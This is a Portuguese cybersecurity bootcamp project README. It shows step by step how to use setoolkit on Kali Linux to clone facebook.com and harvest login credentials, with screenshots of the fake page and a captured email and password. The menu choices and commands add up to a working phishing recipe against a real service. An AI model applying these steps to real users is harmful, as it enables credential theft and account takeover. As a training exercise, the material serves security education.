# 📐 Desafio de Projeto 🚀

## Phishing para captura de senhas do Facebook

Neste desafio de projeto, iremos criar um Phishing para capturar senhas de login do Facebook.

### Ferramentas

- <img title="Kali Linux" src="https://www.iconarchive.com/download/i150099/simpleicons-team/simple/kali-linux.1024.png" width="70pix" height="70pix" align="middle"> Kali Linux</img> 
- <img title="setoolkit" src="https://gitlab.com/uploads/-/system/project/avatar/11904292/kali-set.png" width="70pix" height="70pix" align="middle"> setoolkit</img>

### Configurando o Phishing no Kali Linux

- Acesso root:
 ``` shell
(lucas@kali)-[~]$ sudo su [ENTER]
[sudo] password for lucas: ***** [ENTER]
 ```
- Iniciando o setoolkit:
 ``` shell
 (root@kali)-[/home/lucas]# setoolkit [ENTER]
 ```
- Aceitando os Termos:
 ``` shell
 Do you agree to the terms of service [y/n]: y [ENTER]
 ```
- Tipo de ataque: 
``` shell
Select from the menu:

  1) Social-Engineering Attacks
  2) ...

  99) Exit ...

set> 1 [ENTER]
```
- Vetor de ataque: 
``` shell
Select from the menu:

   1) ...
   2) Web Site Attack Vectors
   3) ...

   99) Return ...

set> 2 [ENTER]
 ```
- Método de ataque: 
``` shell
  1) ...
  2) ...
  3)Credential Harvester Attack Method

  99) Return ...

set:webattack> 3 [ENTER]
```
- Método de ataque: 
```shell
  1) ...
  2) Site Cloner
  
  99) Return ...

  set:webattack> 2 [ENTER]
 ```
- Obtendo o IP da sua máquina para torná-la um servidor temporário:
```shell
set:webattack> IP address for the POST back in Harvester/Tabnabbing [SEU IP VAI APARECER AQUI]: [ENTER PARA USAR O SEU IP]
```
- URL para clone:
```shell
set:webattack> Enter the url to clone: http://www.facebook.com
 ```

### Resutados

#### Facebook Fake

![Página Fake](./facebook_fake.png "Página Fake do Facebook")

#### Usuário e Senha Capturados

![Senha Capturada](./passwd.png "E-mail e Senha Capturadas")

---

🚧 Projeto da [Dio.me](https://web.dio.me) do curso:

<p>
<img title="Santander Bootcamp Cibersegurança" src="https://hermes.dio.me/tracks/b092559f-ec20-4401-83e5-d98b6278b7b1.png" width="70pix" height="70pix" align="middle">Santander Bootcamp Cibersegurança</img> 
</p>
